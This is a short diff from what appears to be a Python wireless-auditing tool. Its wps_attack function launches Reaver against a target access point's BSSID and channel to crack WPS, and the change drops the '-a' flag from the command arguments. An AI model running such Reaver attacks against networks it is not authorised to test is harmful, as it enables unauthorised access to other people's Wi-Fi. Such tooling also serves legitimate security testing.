@@ -3028,16 +3028,16 @@ def wps_attack(iface, target):
         # Old Reaver
         pid = Popen(
             ["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vvv",
-             "--no-nacks", "-L", "-a", "-P"],
+             "--no-nacks", "-L", "-P"],
             stdout=p_out).pid
     else:
         # Default reaver for pixiewps
         pid = Popen(
             ["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv",
-             "--no-nacks", "-L", "-a", "-P"],
+             "--no-nacks", "-L", "-P"],
             stdout=p_out).pid
 
-    # print 'Running reaver -i %s -c %s -b %s -vv -N -L -a -P' % (iface, target.channel, target.bssid),
+    # print 'Running reaver -i %s -c %s -b %s -vv -N -L -P' % (iface, target.channel, target.bssid),
     p = open(temp + "reaver_out.out")
     try:
         while not pixie_exit:
